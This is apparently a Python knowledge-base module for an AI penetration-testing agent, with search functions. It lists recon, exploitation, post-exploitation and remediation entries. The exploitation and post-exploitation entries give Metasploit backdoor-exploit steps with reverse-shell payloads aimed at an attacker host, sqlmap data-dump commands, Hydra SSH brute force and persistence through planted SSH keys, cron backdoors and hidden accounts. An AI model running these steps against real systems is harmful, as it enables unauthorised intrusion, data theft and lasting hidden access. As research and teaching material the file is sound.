"""
Knowledge Base for PentestAI Instructor Agent (RAG-based)

This knowledge base provides guidance for the Executor agent during penetration testing.
Based on standard penetration testing methodologies from:
- "Penetration Testing: A Hands-On Introduction to Hacking" (Georgia Weidman)
- "Metasploit Penetration Testing Cookbook" (Monika Agarwal, et al.)

IMPORTANT: All commands and techniques are SIMULATED and SYMBOLIC for research purposes.
"""

from typing import Optional
from pentestai.models.data import KnowledgeEntry

# ============================================================================
# RECONNAISSANCE KNOWLEDGE
# ============================================================================

RECONNAISSANCE_KB = [
    KnowledgeEntry(
        id="REC-001",
        title="Port Scanning with Nmap",
        content="""
        Port scanning identifies open ports and services on target systems.
        
        Simulated Approach:
        1. Basic scan: $nmap <target>$
        2. Service detection: $nmap -sV <target>$
        3. OS detection: $nmap -O <target>$
        4. All ports: $nmap -p- <target>$
        
        Expected Symbolic Outputs:
        - PORT_21_OPEN_FTP
        - PORT_22_OPEN_SSH
        - PORT_80_OPEN_HTTP
        - PORT_445_OPEN_SMB
        
        Reference: Penetration Testing, Chapter 3
        """,
        category="reconnaissance",
        tags=["nmap", "scanning", "ports", "services"],
        source="Penetration Testing Book - Ch 3",
    ),
    
    KnowledgeEntry(
        id="REC-002",
        title="Service Version Detection",
        content="""
        Identifying service versions helps determine potential vulnerabilities.
        
        Simulated Approach:
        1. Version scan: $nmap -sV -p<port> <target>$
        2. Script scan: $nmap --script=banner <target>$
        3. Aggressive scan: $nmap -A <target>$
        
        Expected Symbolic Outputs:
        - VSFTPD_2.3.4_DETECTED
        - APACHE_2.4.18_DETECTED
        - OPENSSH_7.2_DETECTED
        - SAMBA_3.X_DETECTED
        
        Reference: Metasploit Cookbook, Chapter 2
        """,
        category="reconnaissance",
        tags=["version", "detection", "services", "banner"],
        source="Metasploit Cookbook - Ch 2",
    ),
    
    KnowledgeEntry(
        id="REC-003",
        title="Vulnerability Scanning",
        content="""
        Automated vulnerability detection using Nmap scripts.
        
        Simulated Approach:
        1. Vuln scan: $nmap --script vuln <target>$
        2. Safe scripts: $nmap --script=safe <target>$
        3. Specific CVE: $nmap --script=<cve-script> <target>$
        
        Expected Symbolic Outputs:
        - CVE_2011_2523_VULNERABLE (vsFTPd backdoor)
        - CVE_2010_2075_VULNERABLE (UnrealIRCd backdoor)
        - CVE_2017_0144_VULNERABLE (EternalBlue)
        
        Reference: Penetration Testing Book, Chapter 4
        """,
        category="reconnaissance",
        tags=["vulnerability", "scanning", "nmap", "cve"],
        source="Penetration Testing Book - Ch 4",
    ),
]

# ============================================================================
# EXPLOITATION KNOWLEDGE
# ============================================================================

EXPLOITATION_KB = [
    KnowledgeEntry(
        id="EXP-001",
        title="vsFTPd 2.3.4 Backdoor Exploitation",
        content="""
        The vsFTPd 2.3.4 version contains a backdoor triggered by specific commands.
        
        Simulated Metasploit Usage:
        1. Select exploit: $msfconsole: use exploit/unix/ftp/vsftpd_234_backdoor$
        2. Set target: $msfconsole: set RHOSTS <target>$
        3. Set local host: $msfconsole: set LHOST <attacker>$
        4. Execute: $msfconsole: exploit$
        
        Expected Symbolic Output:
        - BACKDOOR_SHELL_OBTAINED
        - ROOT_ACCESS_GRANTED
        
        CVE: CVE-2011-2523
        CVSS Score: 10.0 (Critical)
        
        Reference: Metasploit Cookbook, Chapter 5
        """,
        category="exploitation",
        tags=["ftp", "vsftpd", "backdoor", "metasploit", "CVE-2011-2523"],
        source="Metasploit Cookbook - Ch 5",
    ),
    
    KnowledgeEntry(
        id="EXP-002",
        title="UnrealIRCd Backdoor Exploitation",
        content="""
        Trojaned UnrealIRCd versions contain a backdoor in the DEBUG mode.
        
        Simulated Metasploit Usage:
        1. Select exploit: $msfconsole: use exploit/unix/irc/unreal_ircd_3281_backdoor$
        2. Set target: $msfconsole: set RHOSTS <target>$
        3. Set port: $msfconsole: set RPORT 6667$
        4. Set payload: $msfconsole: set PAYLOAD cmd/unix/reverse$
        5. Execute: $msfconsole: exploit$
        
        Expected Symbolic Output:
        - IRC_BACKDOOR_TRIGGERED
        - REVERSE_SHELL_ESTABLISHED
        
        CVE: CVE-2010-2075
        CVSS Score: 7.5 (High)
        
        Reference: Metasploit Cookbook, Chapter 6
        """,
        category="exploitation",
        tags=["irc", "unrealircd", "backdoor", "metasploit", "CVE-2010-2075"],
        source="Metasploit Cookbook - Ch 6",
    ),
    
    KnowledgeEntry(
        id="EXP-003",
        title="Samba usermap_script Exploitation",
        content="""
        Samba 3.X - 4.X versions have a command injection vulnerability.
        
        Simulated Metasploit Usage:
        1. Select exploit: $msfconsole: use exploit/multi/samba/usermap_script$
        2. Set target: $msfconsole: set RHOSTS <target>$
        3. Set ports: $msfconsole: set RPORT 139$ or $msfconsole: set RPORT 445$
        4. Set payload: $msfconsole: set PAYLOAD cmd/unix/reverse_netcat$
        5. Set LHOST: $msfconsole: set LHOST <attacker>$
        6. Execute: $msfconsole: exploit$
        
        Expected Symbolic Output:
        - SAMBA_RCE_SUCCESSFUL
        - ROOT_SHELL_OBTAINED
        
        CVE: CVE-2007-2447
        CVSS Score: 6.0 (Medium)
        
        Reference: Metasploit Cookbook, Chapter 7
        """,
        category="exploitation",
        tags=["samba", "smb", "rce", "metasploit", "CVE-2007-2447"],
        source="Metasploit Cookbook - Ch 7",
    ),
    
    KnowledgeEntry(
        id="EXP-004",
        title="Web Application SQL Injection",
        content="""
        SQL injection allows execution of arbitrary SQL commands.
        
        Simulated Detection:
        1. Manual testing: Test input with: ' OR '1'='1
        2. SQLMap scan: $sqlmap -u "http://<target>/page?id=1" --dbs$
        3. Dump data: $sqlmap -u "http://<target>/page?id=1" -D <db> --dump$
        
        Expected Symbolic Output:
        - SQL_INJECTION_POSSIBLE
        - DATABASE_ACCESS_OBTAINED
        - SENSITIVE_DATA_EXTRACTED
        
        Reference: Penetration Testing Book, Chapter 9
        """,
        category="exploitation",
        tags=["sql", "injection", "web", "sqlmap"],
        source="Penetration Testing Book - Ch 9",
    ),
    
    KnowledgeEntry(
        id="EXP-005",
        title="SSH Weak Credentials",
        content="""
        Testing SSH for weak/default credentials.
        
        Simulated Approach:
        1. Manual test: $ssh user@<target>$ with common passwords
        2. Hydra brute force: $hydra -L users.txt -P passwords.txt <target> ssh$
        3. Metasploit: $msfconsole: use auxiliary/scanner/ssh/ssh_login$
        
        Expected Symbolic Output:
        - WEAK_PASSWORD_FOUND
        - SSH_ACCESS_GRANTED
        - DEFAULT_CREDENTIALS_DETECTED
        
        Reference: Penetration Testing Book, Chapter 5
        """,
        category="exploitation",
        tags=["ssh", "authentication", "credentials", "brute-force"],
        source="Penetration Testing Book - Ch 5",
    ),
]

# ============================================================================
# POST-EXPLOITATION KNOWLEDGE
# ============================================================================

POST_EXPLOITATION_KB = [
    KnowledgeEntry(
        id="POST-001",
        title="Privilege Escalation on Linux",
        content="""
        Techniques to escalate privileges after initial access.
        
        Simulated Approach:
        1. Check SUID binaries: $find / -perm -4000 2>/dev/null$
        2. Check sudo permissions: $sudo -l$
        3. Kernel exploits: Search for kernel version exploits
        4. Cron jobs: $cat /etc/crontab$
        
        Expected Symbolic Output:
        - SUID_BINARY_FOUND
        - SUDO_MISCONFIGURATION
        - KERNEL_EXPLOIT_AVAILABLE
        - ROOT_ACCESS_OBTAINED
        
        Reference: Penetration Testing Book, Chapter 11
        """,
        category="post_exploitation",
        tags=["privilege", "escalation", "linux", "suid"],
        source="Penetration Testing Book - Ch 11",
    ),
    
    KnowledgeEntry(
        id="POST-002",
        title="Persistence Mechanisms",
        content="""
        Maintaining access to compromised systems.
        
        Simulated Techniques:
        1. SSH keys: Add attacker's public key to ~/.ssh/authorized_keys
        2. Cron jobs: Add backdoor script to crontab
        3. Service modification: Modify system services
        4. User creation: Create hidden user accounts
        
        Expected Symbolic Output:
        - PERSISTENCE_ESTABLISHED
        - BACKDOOR_INSTALLED
        - HIDDEN_USER_CREATED
        
        Reference: Metasploit Cookbook, Chapter 10
        """,
        category="post_exploitation",
        tags=["persistence", "backdoor", "access"],
        source="Metasploit Cookbook - Ch 10",
    ),
]

# ============================================================================
# REMEDIATION KNOWLEDGE
# ============================================================================

REMEDIATION_KB = [
    KnowledgeEntry(
        id="REM-001",
        title="Patching vsFTPd Backdoor",
        content="""
        Steps to remediate vsFTPd 2.3.4 backdoor vulnerability.
        
        Recommended Actions:
        1. Update to latest version: $sudo apt-get update && sudo apt-get install vsftpd$
        2. Or remove if not needed: $sudo apt-get remove vsftpd$
        3. Configure firewall: $sudo ufw deny 21/tcp$
        4. Audit access logs: $sudo tail -f /var/log/vsftpd.log$
        
        Cost: 2.0 (Low - simple patch)
        Value: 10.0 (Critical vulnerability)
        
        Reference: CVE-2011-2523 Remediation Guide
        """,
        category="remediation",
        tags=["ftp", "patch", "update", "vsftpd"],
        source="CVE Remediation Guide",
    ),
    
    KnowledgeEntry(
        id="REM-002",
        title="Securing Samba Services",
        content="""
        Steps to secure Samba against exploitation.
        
        Recommended Actions:
        1. Update Samba: $sudo apt-get update && sudo apt-get install samba$
        2. Configure smb.conf: Disable unnecessary features
        3. Firewall rules: $sudo ufw allow from <trusted_network> to any port 445$
        4. Access controls: Set proper share permissions
        
        Cost: 2.0 (Low - configuration change)
        Value: 6.0 (Medium severity)
        
        Reference: Samba Security Best Practices
        """,
        category="remediation",
        tags=["samba", "smb", "configuration", "firewall"],
        source="Samba Security Guide",
    ),
    
    KnowledgeEntry(
        id="REM-003",
        title="Web Application Hardening",
        content="""
        General web application security improvements.
        
        Recommended Actions:
        1. Input validation: Implement strict input sanitization
        2. Prepared statements: Use parameterized queries
        3. WAF deployment: $sudo apt-get install modsecurity$
        4. HTTPS enforcement: Configure SSL/TLS certificates
        5. Security headers: Add Content-Security-Policy, X-Frame-Options
        
        Cost: 5.0 (Medium - requires code changes)
        Value: 8.5 (High severity)
        
        Reference: OWASP Top 10 Remediation
        """,
        category="remediation",
        tags=["web", "sql-injection", "xss", "hardening"],
        source="OWASP Guidelines",
    ),
    
    KnowledgeEntry(
        id="REM-004",
        title="SSH Hardening",
        content="""
        Securing SSH against brute force and weak credentials.
        
        Recommended Actions:
        1. Disable root login: Edit /etc/ssh/sshd_config, set PermitRootLogin no
        2. Key-based auth: Disable password authentication
        3. Fail2ban: $sudo apt-get install fail2ban$
        4. Change default port: Set Port 2222 in sshd_config
        5. Restart service: $sudo systemctl restart sshd$
        
        Cost: 2.0 (Low - configuration only)
        Value: 7.5 (High severity)
        
        Reference: SSH Security Best Practices
        """,
        category="remediation",
        tags=["ssh", "authentication", "hardening", "fail2ban"],
        source="SSH Security Guide",
    ),
]

# ============================================================================
# COMBINED KNOWLEDGE BASE
# ============================================================================

KNOWLEDGE_BASE: list[KnowledgeEntry] = (
    RECONNAISSANCE_KB + 
    EXPLOITATION_KB + 
    POST_EXPLOITATION_KB + 
    REMEDIATION_KB
)


# ============================================================================
# KNOWLEDGE BASE SEARCH FUNCTIONS
# ============================================================================

def search_knowledge(query: str, top_k: int = 3) -> list[KnowledgeEntry]:
    """
    Search knowledge base by query string.
    
    Simple keyword-based search. In production, would use vector embeddings.
    
    Args:
        query: Search query
        top_k: Number of results to return
        
    Returns:
        List of matching knowledge entries
    """
    query_lower = query.lower()
    results = []
    
    for entry in KNOWLEDGE_BASE:
        score = 0.0
        
        # Score based on title match
        if query_lower in entry.title.lower():
            score += 3.0
        
        # Score based on content match
        if query_lower in entry.content.lower():
            score += 2.0
        
        # Score based on tag match
        for tag in entry.tags:
            if query_lower in tag.lower():
                score += 1.0
        
        if score > 0:
            entry.relevance_score = score
            results.append(entry)
    
    # Sort by relevance and return top_k
    results.sort(key=lambda x: x.relevance_score, reverse=True)
    return results[:top_k]


def get_knowledge_by_category(category: str) -> list[KnowledgeEntry]:
    """
    Get all knowledge entries for a specific category.
    
    Args:
        category: Category name (reconnaissance, exploitation, etc.)
        
    Returns:
        List of matching knowledge entries
    """
    return [entry for entry in KNOWLEDGE_BASE if entry.category == category]


def get_knowledge_by_tags(tags: list[str]) -> list[KnowledgeEntry]:
    """
    Get knowledge entries matching any of the given tags.
    
    Args:
        tags: List of tags to search for
        
    Returns:
        List of matching knowledge entries
    """
    results = []
    tags_lower = [tag.lower() for tag in tags]
    
    for entry in KNOWLEDGE_BASE:
        entry_tags_lower = [tag.lower() for tag in entry.tags]
        if any(tag in entry_tags_lower for tag in tags_lower):
            results.append(entry)
    
    return results


def get_knowledge_by_id(entry_id: str) -> Optional[KnowledgeEntry]:
    """
    Get a specific knowledge entry by ID.
    
    Args:
        entry_id: Knowledge entry ID
        
    Returns:
        Knowledge entry or None if not found
    """
    for entry in KNOWLEDGE_BASE:
        if entry.id == entry_id:
            return entry
    return None
